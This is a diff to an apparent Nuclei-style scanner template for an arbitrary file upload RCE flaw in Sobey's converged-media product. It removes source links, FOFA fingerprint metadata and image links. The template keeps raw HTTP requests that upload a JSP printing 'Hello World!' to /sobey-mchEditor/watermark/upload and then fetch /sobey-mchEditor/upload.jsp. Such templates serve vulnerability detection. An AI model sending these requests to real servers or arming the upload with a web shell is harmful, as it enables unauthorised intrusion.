@@ -3,12 +3,8 @@ info:
   name: 索贝融媒体Upload存在任意文件上传导致RCE漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/pgshsptuibpi6oqg'
+  description: ''
   tags: rce,file-upload,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: pgshsptuibpi6oqg
-    fofa: app="SOBEY-融媒体"
 http:
 - raw:
   - 'POST /sobey-mchEditor/watermark/upload HTTP/1.1
@@ -57,10 +53,7 @@ http:
 
     <% out.print("Hello World!"); %>
 
-    ------WebKitFormBoundary89I920XG9PT7qiwi--
-
-
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1752856701785-e2485d97-9d8e-44f4-b4b7-5ac3606d7e78.png)'
+    ------WebKitFormBoundary89I920XG9PT7qiwi--'
   redirects: false
   matchers:
   - status:
@@ -69,10 +62,7 @@ http:
 - raw:
   - 'GET /sobey-mchEditor/upload.jsp HTTP/1.1
 
-    Host: {{Hostname}}
-
-
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1752856701950-e58ba7a4-48c2-424f-9d5d-9cb2deae9272.png)'
+    Host: {{Hostname}}'
   redirects: false
   matchers:
   - status:
